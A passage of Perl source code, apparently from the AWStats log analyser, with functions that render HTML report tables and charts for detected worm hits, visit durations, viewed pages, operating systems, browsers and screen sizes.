			  . ( $rest_r ? "+$rest_r" : "" ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /B/i ) {
			print "<td>" . ( Format_Bytes($rest_k) ) . "</td>";
		}
		if ( $ShowRobotsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end(
		"* " . _t("Hits on robots.txt") . ( $TotalRRobots ? " " . _t("Total") : "" ) );
}

#------------------------------------------------------------------------------
# Function:     Prints the worms chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainWorms{
	if ($Debug) { debug( "ShowWormsStats", 2 ); }
	print "$Center<a name=\"worms\">&nbsp;</a><br />\n";
	&tab_head( _t("Worms") . " (" . _t("Top") . " $MaxNbOf{'WormsShown'})",
		19, 0, 'worms' );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"" . Tooltip(21) . ">";
	print "<th>" . Format_Number(( scalar keys %_worm_h )) . " " . _t("Different worms") . "*</th>";
	print "<th>" . _t("Target") . "</th>";
	if ( $ShowWormsStats =~ /H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowWormsStats =~ /B/i ) {
		print
		  "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ShowWormsStats =~ /L/i ) {
		print "<th width=\"120\">" . _t("Last") . "</th>";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \%_worm_h,
		\%_worm_h );
	foreach my $key (@keylist) {
		print "<tr>";
		print "<td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . ( $WormsHashLib{$key} ? $WormsHashLib{$key} : $key )
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
		print "<td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . ( $WormsHashTarget{$key} ? $WormsHashTarget{$key} : $key )
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
		if ( $ShowWormsStats =~ /H/i ) {
			print "<td>" . Format_Number($_worm_h{$key}) . "</td>";
		}
		if ( $ShowWormsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_worm_k{$key} ) . "</td>";
		}
		if ( $ShowWormsStats =~ /L/i ) {
			print "<td>"
			  . (
				$_worm_l{$key}
				? Format_Date( $_worm_l{$key}, 1 )
				: '-'
			  )
			  . "</td>";
		}
		print "</tr>\n";

		#$total_p += $_worm_p{$key};
		$total_h += $_worm_h{$key};
		$total_k += $_worm_k{$key} || 0;
		$count++;
	}

	# For worms we need to count Totals
	my $TotalPagesWorms =
	  0;    #foreach (values %_worm_p) { $TotalPagesWorms+=$_; }
	my $TotalHitsWorms = 0;
	foreach ( values %_worm_h ) { $TotalHitsWorms += $_; }
	my $TotalBytesWorms = 0;
	foreach ( values %_worm_k ) { $TotalBytesWorms += $_; }
	my $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
	my $rest_h = $TotalHitsWorms - $total_h;
	my $rest_k = $TotalBytesWorms - $total_k;

	if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other worms
		print "<tr>";
		print
"<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		print "<td class=\"aws\">-</td>";
		if ( $ShowWormsStats =~ /H/i ) {
			print "<td>" . Format_Number(($rest_h)) . "</td>";
		}
		if ( $ShowWormsStats =~ /B/i ) {
			print "<td>" . ( Format_Bytes($rest_k) ) . "</td>";
		}
		if ( $ShowWormsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
		print "</tr>\n";
	}
	&tab_end("* " . _t("Different worms"));
}

#------------------------------------------------------------------------------
# Function:     Prints the sessions chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSessions{
	if ($Debug) { debug( "ShowSessionsStats", 2 ); }
	print "$Center<a name=\"sessions\">&nbsp;</a><br />\n";
	my $title = "⏱️ " . _t("Visits duration");
	&tab_head( $title, 19, 0, 'sessions' );
	my $Totals = 0;
	my $average_s = 0;
	foreach (@SessionsRange) {
		$average_s += ( $_session{$_} || 0 ) * $SessionsAverage{$_};
		$Totals += $_session{$_} || 0;
	}
	if ($Totals) { $average_s = int( $average_s / $Totals ); }
	else { $average_s = '?'; }
	print "<tr bgcolor=\"#$color_TableBGRowTitle\""
	  . Tooltip(1)
	  . "><th>" . _t("Visits") . ": ".Format_Number($TotalVisits)." - " . _t("Average") . ": ".Format_Number($average_s)." s</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Visits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	$average_s = 0;
	my $total_s   = 0;
	my $count = 0;
	foreach my $key (@SessionsRange) {
		my $p = 0;
		if ($TotalVisits) {
			$p = int( $_session{$key} / $TotalVisits * 1000 ) / 10;
		}
		$total_s += $_session{$key} || 0;
		print "<tr><td class=\"aws\">$key</td>";
		print "<td>"
		  . ( $_session{$key} ? Format_Number($_session{$key}) : "&nbsp;" ) . "</td>";
		print "<td>"
		  . ( $_session{$key} ? "$p %" : "&nbsp;" ) . "</td>";
		print "</tr>\n";
		$count++;
	}
	my $rest_s = $TotalVisits - $total_s;
	if ( $rest_s > 0 ) {    # All others sessions
		my $p = 0;
		if ($TotalVisits) {
			$p = int( $rest_s / $TotalVisits * 1000 ) / 10;
		}
		print "<tr"
		  . Tooltip(20)
		  . "><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>";
		print "<td>".Format_Number($rest_s)."</td>";
		print "<td>" . ( $rest_s ? "$p %" : "&nbsp;" ) . "</td>";
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the pages chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainPages{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) {
		debug(
"ShowPagesStats (MaxNbOf{'PageShown'}=$MaxNbOf{'PageShown'} TotalDifferentPages=$TotalDifferentPages)",
			2
		);
	}
	my $regext         = qr/\.(\w{1,6})$/;
	print
"$Center<a name=\"urls\">&nbsp;</a><a name=\"entry\">&nbsp;</a><a name=\"exit\">&nbsp;</a><br />\n";
	my $title =
_t("Viewed pages") . " (" . _t("Top") . " $MaxNbOf{'PageShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=urldetail")
		: "$StaticLinks.urldetail.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	if ( $ShowPagesStats =~ /E/i ) {
		$title .= " &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=urlentry")
			: "$StaticLinks.urlentry.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Entry") . "</a>";
	}
	if ( $ShowPagesStats =~ /X/i ) {
		$title .= " &nbsp; - &nbsp; <a href=\""
		  . (
			$ENV{'GATEWAY_INTERFACE'}
			  || !$StaticLinks
			? XMLEncode("$AWScript${NewLinkParams}output=urlexit")
			: "$StaticLinks.urlexit.$StaticExt"
		  )
		  . "\"$NewLinkTarget>" . _t("Exit") . "</a>";
	}
	
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=SIDER&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        	
	&tab_head( "$title", 19, 0, 'urls' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th>".Format_Number($TotalDifferentPages)." " . _t("Different pages") . "</th>";
	if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ShowPagesStats =~ /B/i ) {
		print
		  "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>";
	}
	if ( $ShowPagesStats =~ /E/i ) {
		print
		  "<th bgcolor=\"#$color_e\" width=\"80\">" . _t("Entry") . "</th>";
	}
	if ( $ShowPagesStats =~ /X/i ) {
		print
		  "<th bgcolor=\"#$color_x\" width=\"80\">" . _t("Exit") . "</th>";
	}

	# Call to plugins' function ShowPagesAddField
	foreach
	  my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
	{

		#				my $function="ShowPagesAddField_$pluginname('title')";
		#				eval("$function");
		my $function = "ShowPagesAddField_$pluginname";
		&$function('title');
	}
	print "<th>&nbsp;</th></tr>\n";
	my $total_p = my $total_e = my $total_x = my $total_k = 0;
	my $max_p   = 1;
	my $max_k   = 1;
	my $count = 0;
	&BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
		\%_url_p );
	foreach my $key (@keylist) {
		if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
		if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {
			$max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );
		}
	}
	foreach my $key (@keylist) {
		print "<tr><td class=\"aws\">";
		&HTMLShowURLInfo($key);
		print "</td>";
		my $bredde_p = 0;
		my $bredde_e = 0;
		my $bredde_x = 0;
		my $bredde_k = 0;
		if ( $max_p > 0 ) {
			$bredde_p =
			  int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }
		if ( $max_p > 0 ) {
			$bredde_e =
			  int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }
		if ( $max_p > 0 ) {
			$bredde_x =
			  int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;
		}
		if ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth *
				  ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
				  $max_k ) + 1;
		}
		if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
		if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
			print "<td>".Format_Number($_url_p{$key})."</td>";
		}
		if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
			print "<td>".Format_Number($_url_p{$key})."</td>";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$_url_k{$key}
				? Format_Bytes(
					$_url_k{$key} / ( $_url_p{$key} || 1 )
				  )
				: "&nbsp;"
			  )
			  . "</td>";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>"
			  . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>"
			  . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : "&nbsp;" ) . "</td>";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname (
			keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{

			#					my $function="ShowPagesAddField_$pluginname('$key')";
			#					eval("$function");
			my $function = "ShowPagesAddField_$pluginname";
			&$function($key);
		}
		print "<td class=\"aws\">";
		if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"4\""
			  . AltTitle("")
			  . " /><br />";
		}
		if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_p\" height=\"4\""
			  . AltTitle("")
			  . " /><br />";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"4\""
			  . AltTitle("")
			  . " /><br />";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'he'}\" width=\"$bredde_e\" height=\"4\""
			  . AltTitle("")
			  . " /><br />";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hx'}\" width=\"$bredde_x\" height=\"4\""
			  . AltTitle("") . " />";
		}
		print "</td></tr>\n";
		$total_p += $_url_p{$key} || 0;
		$total_e += $_url_e{$key} || 0;
		$total_x += $_url_x{$key} || 0;
		$total_k += $_url_k{$key} || 0;
		$count++;
	}
	my $rest_p = $TotalPages - $total_p;
	my $rest_e = $TotalEntries - $total_e;
	my $rest_x = $TotalExits - $total_x;
	my $rest_k = $TotalBytesPages - $total_k;
	if ( $rest_p > 0 || $rest_k > 0 || $rest_e > 0 || $rest_x > 0 )
	{    # All other urls
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
			print "<td>".Format_Number($rest_p)."</td>";
		}
		if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
			print "<td>".Format_Number($rest_p)."</td>";
		}
		if ( $ShowPagesStats =~ /B/i ) {
			print "<td>"
			  . (
				$rest_k
				? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
				: "&nbsp;"
			  )
			  . "</td>";
		}
		if ( $ShowPagesStats =~ /E/i ) {
			print "<td>" . ( $rest_e ? Format_Number($rest_e) : "&nbsp;" ) . "</td>";
		}
		if ( $ShowPagesStats =~ /X/i ) {
			print "<td>" . ( $rest_x ? Format_Number($rest_x) : "&nbsp;" ) . "</td>";
		}

		# Call to plugins' function ShowPagesAddField
		foreach my $pluginname (
			keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
		{

			#					my $function="ShowPagesAddField_$pluginname('')";
			#					eval("$function");
			my $function = "ShowPagesAddField_$pluginname";
			&$function('');
		}
		print "<td>&nbsp;</td></tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the OS chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainOS{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;

	if ($Debug) { debug( "ShowOSStats", 2 ); }
	print "$Center<a name=\"os\">&nbsp;</a><br />\n";
	my $Totalh   = 0;
	my $Totalp   = 0;
	my %new_os_h = ();
	my %new_os_p = ();
  OSLOOP: foreach my $key ( keys %_os_h ) {
		$Totalh += $_os_h{$key};
		$Totalp += $_os_p{$key};
		foreach my $family ( keys %OSFamily ) {
			if ( $key =~ /^$family/i ) {
				$new_os_h{"${family}cumul"} += $_os_h{$key};
				$new_os_p{"${family}cumul"} += $_os_p{$key};
				next OSLOOP;
			}
		}
		$new_os_h{$key} += $_os_h{$key};
		$new_os_p{$key} += $_os_p{$key};
	}
	my $title =
_t("Operating Systems") . " (" . _t("Top") . " $MaxNbOf{'OsShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=osdetail")
		: "$StaticLinks.osdetail.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "/" . _t("Detailed") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=unknownos")
		: "$StaticLinks.unknownos.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Unknown") . "</a>";
	  
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=OS&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        	  
	&tab_head( "$title", 19, 0, 'os' );
	
	&BuildKeyList( $MaxNbOf{'OsShown'}, $MinHit{'Os'}, \%new_os_h,
		\%new_os_p );
		
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int(  $new_os_h{$key} / $Totalh * 1000 ) / 10;
				if ($key eq 'Unknown'){push @blocklabel, "$key"; }
				else{
					my $keywithoutcumul = $key;
					$keywithoutcumul =~ s/cumul$//i;
					my $libos = $OSHashLib{$keywithoutcumul}
					  || $keywithoutcumul;
					my $nameicon = $keywithoutcumul;
					$nameicon =~ s/[^\w]//g;
					if ( $OSFamily{$keywithoutcumul} ) {
						$libos = $OSFamily{$keywithoutcumul};
					}
					push @blocklabel, "$libos";
				}
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"5\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("Top 5 Operating Systems"),       "oss",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td></tr>";
		}
	}
	
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th>" . _t("Operating Systems") . "</th>";
	print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	
	foreach my $key (@keylist) {
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($Totalh) {
			$p_h = int( $new_os_h{$key} / $Totalh * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($Totalp) {
			$p_p = int( $new_os_p{$key} / $Totalp * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		if ( $key eq 'Unknown' ) {
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/os\/unknown.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>"
			  . "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td><td>".Format_Number($_os_h{$key})."</td><td>$p_h</td></tr>\n";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libos = $OSHashLib{$keywithoutcumul}
			  || $keywithoutcumul;
			my $nameicon = $keywithoutcumul;
			$nameicon =~ s/[^\w]//g;
			if ( $OSFamily{$keywithoutcumul} ) {
				$libos = "<b>" . $OSFamily{$keywithoutcumul} . "</b>";
			}
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/os\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\">$libos</td><td>".Format_Number($new_os_p{$key})."</td><td>$p_p</td><td>".Format_Number($new_os_h{$key})."</td><td>$p_h</td></tr>\n";
		}
		$total_h += $new_os_h{$key};
		$total_p += $new_os_p{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $Totalh / $total_h", 2 );
	}
	my $rest_h = $Totalh - $total_h;
	my $rest_p = $Totalp - $total_p;
	if ( $rest_h > 0 ) {
		my $p_p;
		my $p_h;
		if ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }
		if ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }
		print "<tr>";
		print "<td>&nbsp;</td>";
		print
"<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td><td>".Format_Number($rest_p)."</td>";
		print "<td>$p_p %</td><td>".Format_Number($rest_h)."</td><td>$p_h %</td></tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Browsers chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainBrowsers{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowBrowsersStats", 2 ); }
	print "$Center<a name=\"browsers\">&nbsp;</a><br />\n";
	my $Totalh        = 0;
	my $Totalp        = 0;
	my %new_browser_h = ();
	my %new_browser_p = ();
  BROWSERLOOP: foreach my $key ( keys %_browser_h ) {
		$Totalh += $_browser_h{$key};
		$Totalp += $_browser_p{$key};
		foreach my $family ( keys %BrowsersFamily ) {
			if ( $key =~ /^$family/i ) {
				$new_browser_h{"${family}cumul"} += $_browser_h{$key};
				$new_browser_p{"${family}cumul"} += $_browser_p{$key};
				next BROWSERLOOP;
			}
		}
		$new_browser_h{$key} += $_browser_h{$key};
		$new_browser_p{$key} += $_browser_p{$key};
	}
	my $title =
_t("Browsers") . " (" . _t("Top") . " $MaxNbOf{'BrowsersShown'}) &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=browserdetail")
		: "$StaticLinks.browserdetail.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "/" . _t("Detailed") . "</a> &nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=unknownbrowser")
		: "$StaticLinks.unknownbrowser.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Unknown") . "</a>";
	  

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=BROWSER&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        	  
	&tab_head( "$title", 19, 0, 'browsers' );
	
	&BuildKeyList(
		$MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},
		\%new_browser_h,           \%new_browser_p
	);
	
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int(  $new_browser_h{$key} / $TotalHits * 1000 ) / 10;
				if ($key eq 'Unknown'){push @blocklabel, "$key"; }
				else{
					my $keywithoutcumul = $key;
					$keywithoutcumul =~ s/cumul$//i;
					my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}
					  || $keywithoutcumul;
					my $nameicon = $BrowsersHashIcon{$keywithoutcumul}
					  || "notavailable";
					if ( $BrowsersFamily{$keywithoutcumul} ) {
						$libbrowser = "$libbrowser";
					}
					push @blocklabel, "$libbrowser";
				}
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"5\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				_t("Top 5 Browsers"),       "browsers",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td></tr>";
		}
	}
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th>" . _t("Browsers") . "</th><th width=\"80\">" . _t("Unique visitors") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_h = 0;
	my $total_p = 0;
	my $count = 0;
	foreach my $key (@keylist) {
		my $p_h = '&nbsp;';
		my $p_p = '&nbsp;';
		if ($Totalh) {
			$p_h = int( $new_browser_h{$key} / $Totalh * 1000 ) / 10;
			$p_h = "$p_h %";
		}
		if ($Totalp) {
			$p_p = int( $new_browser_p{$key} / $Totalp * 1000 ) / 10;
			$p_p = "$p_p %";
		}
		if ( $key eq 'Unknown' ) {
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/browser\/unknown.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td><td width=\"80\">?</td>"
			  . "<td>".Format_Number($_browser_p{$key})."</td><td>$p_p</td>"
			  . "<td>".Format_Number($_browser_h{$key})."</td><td>$p_h</td></tr>\n";
		}
		else {
			my $keywithoutcumul = $key;
			$keywithoutcumul =~ s/cumul$//i;
			my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}
			  || $keywithoutcumul;
			my $nameicon = $BrowsersHashIcon{$keywithoutcumul}
			  || "notavailable";
			if ( $BrowsersFamily{$keywithoutcumul} ) {
				$libbrowser = "<b>$libbrowser</b>";
			}
			print "<tr><td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/browser\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td><td class=\"aws\">"
			  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
			  . "$libbrowser"
			  . ( $PageDir eq 'rtl' ? "</span>" : "" )
			  . "</td><td>"
			  . (
				$BrowsersHereAreGrabbers{$key}
				? "<b>" . _t("Grabber") . "</b>"
				: _t("Pages")
			  )
			  . "</td><td>".Format_Number($new_browser_p{$key})."</td><td>$p_p</td><td>".Format_Number($new_browser_h{$key})."</td><td>$p_h</td></tr>\n";
		}
		$total_h += $new_browser_h{$key};
		$total_p += $new_browser_p{$key};
		$count++;
	}
	if ($Debug) {
		debug( "Total real / shown : $Totalh / $total_h", 2 );
	}
	my $rest_h = $Totalh - $total_h;
	my $rest_p = $Totalp - $total_p;
	if ( $rest_h > 0 ) {
		my $p_p = 0.0;
		my $p_h;
		if ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }
		if ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }
		print "<tr>";
		print "<td>&nbsp;</td>";
		print
"<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td><td>&nbsp;</td><td>$rest_p</td>";
		print "<td>$p_p %</td><td>$rest_h</td><td>$p_h %</td></tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the ScreenSize chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainScreenSize{
	if ($Debug) { debug( "ShowScreenSizeStats", 2 ); }
	print "$Center<a name=\"screensizes\">&nbsp;</a><br />\n";
	my $Totalh = 0;
	foreach ( keys %_screensize_h ) { $Totalh += $_screensize_h{$_}; }
	my $title =
	  _t("Screen sizes") . " (" . _t("Top") . " $MaxNbOf{'ScreenSizesShown'})";
	&tab_head( "$title", 0, 0, 'screensizes' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Screen sizes") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
	my $total_h = 0;
	my $count   = 0;
	&BuildKeyList( $MaxNbOf{'ScreenSizesShown'},
		$MinHit{'ScreenSize'}, \%_screensize_h, \%_screensize_h );

	foreach my $key (@keylist) {
		my $p = '&nbsp;';
		if ($Totalh) {
			$p = int( $_screensize_h{$key} / $Totalh * 1000 ) / 10;
			$p = "$p %";
		}
		$total_h += $_screensize_h{$key} || 0;
		print "<tr>";
		if ( $key eq 'Unknown' ) {
			print
"<td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Unknown") . "</span></td>";
			print "<td>$p</td>";
		}
		else {
			my $screensize = $key;
			print "<td class=\"aws\">$screensize</td>";
			print "<td>$p</td>";
		}
		print "</tr>\n";
		$count++;
	}
	my $rest_h = $Totalh - $total_h;
	if ( $rest_h > 0 ) {    # All others sessions
		my $p = 0;
		if ($Totalh) { $p = int( $rest_h / $Totalh * 1000 ) / 10; }
		print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
